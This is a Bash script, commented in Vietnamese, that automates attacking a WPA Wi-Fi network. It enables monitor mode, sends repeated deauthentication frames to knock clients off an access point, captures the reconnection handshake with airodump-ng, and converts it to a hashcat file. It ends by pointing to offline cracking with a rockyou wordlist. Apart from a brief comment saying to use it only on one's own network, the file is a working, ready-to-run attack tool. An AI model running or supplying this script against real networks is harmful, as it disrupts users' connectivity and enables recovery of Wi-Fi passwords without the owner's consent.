#!/usr/bin/env bash
# Bắt WPA 4-way handshake bằng airodump-ng + deauth ngắn (mạng của bạn).
# Ví dụ:
#   sudo ./handshake.sh wlan0 AA:BB:CC:DD:EE:FF 6
#   sudo ./handshake.sh wlan0 AA:BB:CC:DD:EE:FF 6 11:22:33:44:55:66 60
# Lưu ý: thiết bị bật PMF/802.11w có thể bỏ qua deauth — khi đó chờ client tự kết nối lại.
set -euo pipefail

if [[ $EUID -ne 0 ]]; then
  echo "[x] chạy bằng sudo" >&2
  exit 1
fi
IFACE="${1:?usage: sudo ./handshake.sh <iface> <bssid> <channel> [client_mac] [seconds]}"
BSSID="${2:?thiếu BSSID}"
CHANNEL="${3:?thiếu channel}"
CLIENT="${4:-}"
TIMEOUT="${5:-45}"

ROOT="$(cd "$(dirname "$0")/.." && pwd)"
OUT_DIR="$ROOT/captures"
mkdir -p "$OUT_DIR"
STAMP="$(date +%Y%m%d-%H%M%S)"
PREFIX="$OUT_DIR/hs-$STAMP"
CAP="$PREFIX-01.cap"

for tool in airodump-ng aireplay-ng aircrack-ng; do
  command -v "$tool" >/dev/null || { echo "[x] thiếu $tool. Kali: apt install aircrack-ng" >&2; exit 1; }
done

airmon-ng check kill >/dev/null 2>&1 || true

MON=""
airmon-ng start "$IFACE" >/dev/null 2>&1 || true
MON="$(iw dev | awk '/Interface/ {i=$2} /type monitor/ {print i; exit}')"
if [[ -z "$MON" ]]; then
  if iw dev "$IFACE" info 2>/dev/null | grep -q 'type monitor'; then
    MON="$IFACE"
  else
    echo "[x] không bật được monitor mode trên $IFACE (card/driver không hỗ trợ?)" >&2
    exit 1
  fi
fi

echo "[*] monitor: $MON | BSSID: $BSSID | kênh: $CHANNEL"
airodump-ng -c "$CHANNEL" --bssid "$BSSID" -w "$PREFIX" --output-format pcap "$MON" >/dev/null 2>&1 &
DUMP_PID=$!
cleanup() {
  kill "$DUMP_PID" 2>/dev/null || true
  wait "$DUMP_PID" 2>/dev/null || true
  airmon-ng stop "$MON" >/dev/null 2>&1 || true
}
trap cleanup EXIT

sleep 5

deauth() {
  local count="$1"
  if [[ -n "$CLIENT" ]]; then
    aireplay-ng --deauth "$count" -a "$BSSID" -c "$CLIENT" "$MON" >/dev/null 2>&1 || true
  else
    aireplay-ng --deauth "$count" -a "$BSSID" "$MON" >/dev/null 2>&1 || true
  fi
}

has_handshake() {
  [[ -f "$CAP" ]] || return 1
  (aircrack-ng "$CAP" 2>/dev/null || true) | grep -qi 'handshake'
}

echo "[*] deauth để ép client reconnect (chỉ mạng của bạn)"
deauth 4

for ((i = 0; i < TIMEOUT; i++)); do
  if has_handshake; then
    break
  fi
  sleep 1
  if ((i % 10 == 9)); then
    deauth 2
  fi
done

cleanup
trap - EXIT

if ! has_handshake; then
  echo "[-] chưa bắt được handshake trong ${TIMEOUT}s."
  echo "    Thử: client đang kết nối? kênh đúng? đứng gần AP hơn? chạy lại và chờ lâu hơn."
  exit 1
fi

echo "[+] handshake OK → $CAP"

if command -v hcxpcapngtool >/dev/null; then
  HASH="${CAP%.cap}.hc22000"
  hcxpcapngtool -o "$HASH" "$CAP" | tail -n 30
  if [[ -s "$HASH" ]]; then
    echo "[+] xong. Copy $HASH sang Windows rồi chạy: python crack.py <file.hc22000>"
    exit 0
  fi
fi

echo "[!] convert trên Windows: hcxpcapngtool -o hs.hc22000 \"$CAP\"  (hcxtools win64)"
echo "    Hoặc crack thẳng bằng aircrack-ng: aircrack-ng -w /usr/share/wordlists/rockyou.txt \"$CAP\""
